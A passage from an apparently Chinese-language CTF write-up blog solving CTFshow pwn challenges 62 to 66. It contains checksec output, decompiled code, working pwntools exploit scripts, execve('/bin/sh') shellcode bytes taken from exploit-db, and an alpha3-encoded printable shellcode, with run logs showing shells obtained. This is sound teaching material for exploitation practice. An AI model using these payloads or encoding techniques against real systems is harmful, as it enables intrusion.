amd64-64-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX unknown - GNU_STACK missing</span><br><span class="line">  PIE:        PIE enabled</span><br><span class="line">  Stack:      Executable</span><br><span class="line">  RWX:        Has RWX segments</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure><p>和上一题一样，IDA查看main函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  FILE *__bss_start; <span class="comment">// rdi</span></span><br><span class="line">  _QWORD buf[<span class="number">2</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  buf[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  buf[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  __bss_start = _bss_start;</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  logo(__bss_start, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to CTFshow!&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;What&#x27;s this : [%p] ?\n&quot;</span>, buf);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Maybe it&#x27;s useful ! But how to use it?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x38u</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>整体逻辑还是差不多，不同之处为变量名字换了（这个并不影响），还有不同的是最后读入换成了read函数，并且限制为0x38</p><p>buf分配的空间为0x10，而read的大小为0x38，明显存在溢出，因此我们仍能够使用read来进行栈溢出</p><p>偏移量还是为 <strong>0x10+8&#x3D;24</strong>。</p><p>计算允许的SHELLCODE长度【0x38 -（0x10+8）- 8 &#x3D; 24 】（0x10+8）为造成溢出填充的垃圾数据，后面8为是shellcode地址的长度。因此构建的shellcode必须在24位以内。</p><p>直接使用pwntools生成的继续打肯定是不行了，我们需要去寻找符合条件的shellcode，甚至可以自己尝试写更短的（这里随便给出一个符合题目要求的）：</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">24 bytes</span><br><span class="line">https://www.exploit-db.com/shellcodes/43550</span><br><span class="line">shellcode_x64 =</span><br><span class="line">&quot;\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x5</span><br><span class="line">2\x57\x54\x5e\x0f\x05&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.exploit-db.com/shellcodes/46907</span><br><span class="line">global _start</span><br><span class="line">section .text</span><br><span class="line">_start:</span><br><span class="line">xor rsi,rsi</span><br><span class="line">push rsi</span><br><span class="line">mov rdi,0x68732f2f6e69622f</span><br><span class="line">push rdi</span><br><span class="line">push rsp</span><br><span class="line">pop rdi</span><br><span class="line">push 59</span><br><span class="line">pop rax</span><br><span class="line">cdq</span><br><span class="line">syscall</span><br><span class="line">================================</span><br><span class="line">Instruction for nasm compliation</span><br><span class="line">================================</span><br><span class="line"></span><br><span class="line">nasm -f elf64 shellcode.asm -o shellcode.o</span><br><span class="line">ld shellcode.o -o shellcode</span><br><span class="line"></span><br><span class="line">===================</span><br><span class="line">objdump disassembly</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000401000 &lt;_start&gt;:</span><br><span class="line">  401000:48 31 f6             xor    %rsi,%rsi</span><br><span class="line">  401003:56                   push   %rsi</span><br><span class="line">  401004:48 bf 2f 62 69 6e 2f movabs $0x68732f2f6e69622f,%rdi</span><br><span class="line">  40100b:2f 73 68 </span><br><span class="line">  40100e:57                   push   %rdi</span><br><span class="line">  40100f:54                   push   %rsp</span><br><span class="line">  401010:5f                   pop    %rdi</span><br><span class="line">  401011:6a 3b                pushq  $0x3b</span><br><span class="line">  401013:58                   pop    %rax</span><br><span class="line">  401014:99                   cltd   </span><br><span class="line">  401015:0f 05                syscall </span><br><span class="line"></span><br><span class="line">==================</span><br><span class="line">23 Bytes Shellcode</span><br><span class="line">==================</span><br><span class="line"></span><br><span class="line">\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05</span><br><span class="line"></span><br><span class="line">======================</span><br><span class="line">C Compilation And Test</span><br><span class="line">======================</span><br><span class="line"></span><br><span class="line">gcc -fno-stack-protector -z execstack shellcode.c -o shellcode</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">unsigned char shellcode[] = \</span><br><span class="line">&quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&quot;;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    int (*ret)() = (int(*)())shellcode;</span><br><span class="line">    ret();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>, <span class="number">28189</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">shellcode=<span class="string">b&quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&quot;</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;[&#x27;</span>)</span><br><span class="line">buf_addr = io.recvuntil(<span class="string">b&#x27;]&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">buf_addr = <span class="built_in">int</span>(buf_addr, <span class="number">16</span>)</span><br><span class="line">payload=cyclic(<span class="number">0x10</span>+<span class="number">8</span>)+p64(buf_addr + <span class="number">32</span>)+shellcode</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>简单的增加了一个条件语句，根据参数中是否存在 ‘REMOTE’ 键的值，选择是通过远程连接还是本地进程来运行程序。这样的设计可以根据需要动态选择程序的运行方式，方便在不同环境下进行调试和测试。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 62</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        PIE enabled</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    Stripped:   No</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"> ?</span><br><span class="line">Maybe it<span class="string">&#x27;s useful ! But how to use it?</span></span><br><span class="line"><span class="string">$ ls</span></span><br><span class="line"><span class="string">ctfshow_flag</span></span><br></pre></td></tr></table></figure><h2 id="pwn63"><a href="#pwn63" class="headerlink" title="pwn63"></a>pwn63</h2><p>Hint：又短了一点</p><p>checksec检查保护</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        PIE enabled</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure><p>和上一题一样，IDA查看main函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  FILE *__bss_start; <span class="comment">// rdi</span></span><br><span class="line">  _QWORD buf[<span class="number">2</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  buf[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  buf[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  __bss_start = _bss_start;</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  logo(__bss_start, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to CTFshow!&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;What&#x27;s this : [%p] ?\n&quot;</span>, buf);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Maybe it&#x27;s useful ! But how to use it?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x37u</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">只剩23位了，还可以用上一道</span><br><span class="line">或者</span><br><span class="line"># 23 bytes</span><br><span class="line"># https://www.exploit-db.com/exploits/36858/</span><br><span class="line">shellcode_x64=b&quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&quot;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>, <span class="number">28114</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">shellcode=<span class="string">b&quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&quot;</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;[&#x27;</span>)</span><br><span class="line">buf_addr=io.recvuntil(<span class="string">b&#x27;]&#x27;</span>,drop=<span class="literal">True</span>)</span><br><span class="line">buf_addr=<span class="built_in">int</span>(buf_addr,<span class="number">16</span>)</span><br><span class="line">payload=cyclic(<span class="number">0x10</span>+<span class="number">8</span>)+p64(buf_addr+<span class="number">32</span>)+shellcode</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 80</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"> ?</span><br><span class="line">Maybe it<span class="string">&#x27;s useful ! But how to use it?</span></span><br><span class="line"><span class="string">$ ls</span></span><br><span class="line"><span class="string">ctfshow_flag</span></span><br></pre></td></tr></table></figure><h2 id="pwn64"><a href="#pwn64" class="headerlink" title="pwn64"></a>pwn64</h2><p>Hint：有时候开启某种保护并不代表这条路不通</p><p>checksec检查保护</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure><p>32位程序，开启了NX，部分开启RELRO</p><p>按照题目描述，这里开启了NX，应该是不能执行shellcode了的</p><p>我们接着IDA查看一下main函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *buf; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line"></span><br><span class="line">  buf = mmap(<span class="number">0</span>, <span class="number">0x400u</span>, <span class="number">7</span>, <span class="number">34</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  alarm(<span class="number">0xAu</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Some different!&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( read(<span class="number">0</span>, buf, <span class="number">0x400u</span>) &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Illegal entry!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  ((<span class="type">void</span> (*)(<span class="type">void</span>))buf)();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>buf &#x3D; mmap(0, 0x400u, 7, 34, 0, 0); ：这行代码使用 mmap 函数分配一块内存区域，将其起始地址保存在变量 buf 中。 mmap 函数通常用于在内存中分配一块连续的地址空间，并指定相应的权限和属性。</p><p>这里buf用mmap映射了地址，可读可写可执行，直接传入shellcode，下面 ((void (*)(void))buf)();</p><p>调用了buf，运行shellcode 即可获取shell。</p><p>所以说有时候需要具体情况具体分析，东西并不是一成不变的。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>, <span class="number">28114</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line">io.sendline(shellcode)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 109</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">Some different!</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">ctfshow_flag</span><br></pre></td></tr></table></figure><h2 id="pwn65"><a href="#pwn65" class="headerlink" title="pwn65"></a>pwn65</h2><p>Hint：你是一个好人</p><p>checksec检查保护</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       amd64-64-little</span><br><span class="line">  RELRO:      Full RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX unknown - GNU_STACK missing</span><br><span class="line">  PIE:        PIE enabled</span><br><span class="line">  Stack:      Executable</span><br><span class="line">  RWX:        Has RWX segments</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure><p>64位程序，开启PIE与完全开启RELRO 有RWX: Has RWX segments </p><p>IDA查看main函数（无法反编译，看汇编代码）：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000001155 buf             = byte ptr -410h </span><br><span class="line">#buf=0x410</span><br><span class="line"></span><br><span class="line">.text:0000000000001182                 mov     edx, 400h       ; nbytes</span><br><span class="line">.text:0000000000001187                 mov     rsi, rax        ; buf</span><br><span class="line">.text:000000000000118A                 mov     edi, 0          ; fd</span><br><span class="line">.text:000000000000118F                 mov     eax, 0</span><br><span class="line">.text:0000000000001194                 call    _read</span><br><span class="line">#read(0,buf,0x400)</span><br><span class="line"></span><br><span class="line">.text:0000000000001199    mov     [rbp+var_8], eax  ; 把 eax 的值存到栈变量 var_8 中</span><br><span class="line">.text:000000000000119C    cmp     [rbp+var_8], 0    ; 比较 var_8 和 0</span><br><span class="line">.text:00000000000011A0    jg      short loc_11AC    ; 如果 var_8 &gt; 0，则跳转到 loc_11AC（判断输入长度）</span><br><span class="line">.text:00000000000011A2    mov     eax, 0            ; 否则（var_8 ≤ 0），将 eax 设为 0</span><br><span class="line">.text:00000000000011A7    jmp     locret_1254       ; 无论如何，最终跳转到 locret_1254</span><br></pre></td></tr></table></figure><p>要让程序继续执行下去，得跳转到loc_11AC：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000000000011AC loc_11AC:                               ; CODE XREF: main+4B↑j</span><br><span class="line">.text:00000000000011AC                 mov     [rbp+var_4], 0</span><br><span class="line">.text:00000000000011B3                 jmp     loc_123A</span><br><span class="line">#将栈上的变量 var_4（位于 rbp - 4 处，4 字节大小）赋值为 0,无条件跳转到 loc_123A </span><br></pre></td></tr></table></figure><p>loc_123A：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:000000000000123A loc_123A:                               ; CODE XREF: main+5E↑j</span><br><span class="line">.text:000000000000123A                 mov     eax, [rbp+var_4]</span><br><span class="line">.text:000000000000123D                 cmp     eax, [rbp+var_8]</span><br><span class="line">.text:0000000000001240                 jl      loc_11B8</span><br><span class="line">.text:0000000000001246                 lea     rax, [rbp+buf]</span><br><span class="line">.text:000000000000124D                 call    rax</span><br><span class="line">.text:000000000000124F                 mov     eax, 0</span><br><span class="line">#如果 var_4 &lt; var_8[即0&lt;输入字符串长度]（jl = jump if less than），则跳转到 loc_11B8 标签处,否则获取 buf 的地址 → 调用 buf 中的内容 → 设置返回值 0【字符串地址去执行，可以写入shellcode】</span><br></pre></td></tr></table></figure><p>loc_11B8【用于验证缓冲区中的字符是否在 <strong>小写字母 <code>a-z</code> 范围内</strong>】:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000000000011B8 loc_11B8:                               ; CODE XREF: main+EB↓j</span><br><span class="line">.text:00000000000011B8                 mov     eax, [rbp+var_4]</span><br><span class="line">#将 var_4 的值（通常是索引计数器）加载到 eax【作为缓冲区 buf 的索引，用于遍历字符】</span><br><span class="line">.text:00000000000011BB                 cdqe</span><br><span class="line">#将eax（32位）符号扩展为 rax（64位）【因为后续需要用rax作为内存偏移，确保负数索引正确转换】</span><br><span class="line">.text:00000000000011BD                 movzx   eax, [rbp+rax+buf]</span><br><span class="line">#从 buf[var_4] 位置读取一个字节（就是读取第 var_4 个字符），并零扩展到 eax【rbp + buf 是缓冲区基址，+ rax 是偏移量（即 var_4）】</span><br><span class="line">.text:00000000000011C5                 cmp     al, 60h ; &#x27;`&#x27;</span><br><span class="line">.text:00000000000011C7                 jle     short loc_11DA</span><br><span class="line">#检查字符是否 ≤ 60h（即反引号 `）若是，则跳转到 loc_11DA（处理非法字符）。</span><br><span class="line">.text:00000000000011C9                 mov     eax, [rbp+var_4]</span><br><span class="line">.text:00000000000011CC                 cdqe</span><br><span class="line">.text:00000000000011CE                 movzx   eax, [rbp+rax+buf]</span><br><span class="line">.text:00000000000011D6                 cmp     al, 7Ah ; &#x27;z&#x27;</span><br><span class="line">.text:00000000000011D8                 jle     short loc_1236</span><br><span class="line">#检查字符是否 ≤ 7Ah（即小写字母 z）。若是（字符在 a-z 范围内），跳转到 loc_1236（处理合法字符）。</span><br></pre></td></tr></table></figure><p>loc_11DA【检查字符是否属于 <strong>大写字母 <code>A-Z</code> 范围</strong>】：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000000000011DA loc_11DA:                               ; CODE XREF: main+72↑j</span><br><span class="line">.text:00000000000011DA                 mov     eax, [rbp+var_4]</span><br><span class="line">.text:00000000000011DD                 cdqe</span><br><span class="line">.text:00000000000011DF                 movzx   eax, [rbp+rax+buf]</span><br><span class="line">.text:00000000000011E7                 cmp     al, 40h ; &#x27;@&#x27;</span><br><span class="line">.text:00000000000011E9                 jle     short loc_11FC</span><br><span class="line">.text:00000000000011EB                 mov     eax, [rbp+var_4]</span><br><span class="line">.text:00000000000011EE                 cdqe</span><br><span class="line">.text:00000000000011F0                 movzx   eax, [rbp+rax+buf]</span><br><span class="line">.text:00000000000011F8                 cmp     al, 5Ah ; &#x27;Z&#x27;</span><br><span class="line">.text:00000000000011FA                 jle     short loc_1236</span><br></pre></td></tr></table></figure><p>loc_11FC【检查字符是否属于<strong>数字 <code>0-9</code> 或特殊符号 <code>+-/\*</code> 等</strong>】：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000000000011FC loc_11FC:                               ; CODE XREF: main+94↑j</span><br><span class="line">.text:00000000000011FC                 mov     eax, [rbp+var_4]</span><br><span class="line">.text:00000000000011FF                 cdqe</span><br><span class="line">.text:0000000000001201                 movzx   eax, [rbp+rax+buf]</span><br><span class="line">.text:0000000000001209                 cmp     al, 2Fh ; &#x27;/&#x27;</span><br><span class="line">.text:000000000000120B                 jle     short loc_121E</span><br><span class="line">.text:000000000000120D                 mov     eax, [rbp+var_4]</span><br><span class="line">.text:0000000000001210                 cdqe</span><br><span class="line">.text:0000000000001212                 movzx   eax, [rbp+rax+buf]</span><br><span class="line">.text:000000000000121A                 cmp     al, 5Ah ; &#x27;Z&#x27;</span><br><span class="line">.text:000000000000121C                 jle     short loc_1236</span><br><span class="line">#如果小于等于 0x2F，跳到 loc_121E</span><br><span class="line">#如果小于等于 0x5A，还是跳到 loc_1236</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:000000000000121E loc_121E:                               ; CODE XREF: main+B6↑j</span><br><span class="line">.text:000000000000121E                 lea     rdi, format     ; &quot;Good,but not right&quot;</span><br><span class="line">.text:0000000000001225                 mov     eax, 0</span><br><span class="line">.text:000000000000122A                 call    _printf</span><br><span class="line">.text:000000000000122F                 mov     eax, 0</span><br><span class="line">.text:0000000000001234                 jmp     short locret_1254</span><br><span class="line">.text:0000000000001236 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000001236</span><br><span class="line">.text:0000000000001236 loc_1236:                               ; CODE XREF: main+83↑j</span><br><span class="line">.text:0000000000001236                                         ; main+A5↑j ...</span><br><span class="line">.text:0000000000001236                 add     [rbp+var_4], 1</span><br><span class="line">.text:000000000000123A</span><br><span class="line"></span><br><span class="line">.text:0000000000001254</span><br><span class="line">.text:0000000000001254 locret_1254:                            ; CODE XREF: main+52↑j</span><br><span class="line">.text:0000000000001254                                         ; main+DF↑j</span><br><span class="line">.text:0000000000001254                 leave</span><br><span class="line">.text:0000000000001255                 retn</span><br><span class="line">.text:0000000000001255 ; &#125; // starts at 1155</span><br><span class="line">.text:0000000000001255 main            endp</span><br></pre></td></tr></table></figure><p>总结：输入的字符大致限定在了(60,74)||(2f,5a)两个范围里，都是可打印字符，但是我们的 shellcode 实际上是会包含一些不可打印字符的。string.printable，就是可见字符shellcode。因此这里需要借助到一个工具：alpha3【<code>git clone https://github.com/TaQini/alpha3.git</code>】</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">sudo</span> nano exp.py</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;shellcode&#x27;</span>, <span class="string">&#x27;bw&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">f.write(shellcode)</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br></pre></td></tr></table></figure><p>当前目录下会生成一个名为 <code>shellcode</code> 的二进制文件</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ xxd shellcode  <span class="comment"># 以十六进制形式查看</span></span><br><span class="line">00000000: 6a68 48b8 2f62 696e 2f2f 2f73 5048 89e7  jhH./bin///sPH..</span><br><span class="line">00000010: 6872 6901 0181 3424 0101 0101 31f6 566a  hri...4$....1.Vj</span><br><span class="line">00000020: 085e 4801 e656 4889 e631 d26a 3b58 0f05  .^H..VH..1.j;X..</span><br><span class="line">$ <span class="built_in">cat</span> shellcode</span><br><span class="line">jhH¸/bin///sPH槲i4$^H啈䲒j;X</span><br></pre></td></tr></table></figure><p>使用pwntools生成一个shellcode，没法直接输出，有乱码，将shellcode重定向到一个文件中 切换到alpha3目录中，使用alpha3生成string.printable</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> alpha3</span><br><span class="line">root@pwn_challenge:/CTFshow_pwn/alpha3$ python2 ./ALPHA3.py x64 ascii mixedcase rax --input=<span class="string">&quot;shellcode&quot;</span></span><br><span class="line">Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t</span><br></pre></td></tr></table></figure><p><code>python3不行，得用Python2【24.04已经没有Python2了，用20.04的】</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">shellcode=<span class="string">b&quot;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&quot;</span></span><br><span class="line">io.sendafter(<span class="string">b&#x27;Input you Shellcode\n&#x27;</span>,shellcode) <span class="comment">#sendline会使用到换行符，这个也是不可打印字符，要使用send</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 239</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">ctfshow_flag</span><br></pre></td></tr></table></figure><h2 id="pwn66"><a href="#pwn66" class="headerlink" title="pwn66"></a>pwn66</h2><p><code>原题来自：starctf_2019_babyshell</code></p><p>Hint：简单的shellcode？不对劲，十分得有十二分的不对劲</p><p>checksec检查保护</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       amd64-64-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX enabled</span><br><span class="line">  PIE:        No PIE (0x400000)</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure><p>64位关闭栈保护与PIE</p><p>从运行的程序的hint以及题目描述中我们能看到与shellcode有关，但是是有限制的shellcode</p><p>IDA查看main函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *buf; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  logo();</span><br><span class="line">  buf = mmap(<span class="number">0</span>, <span 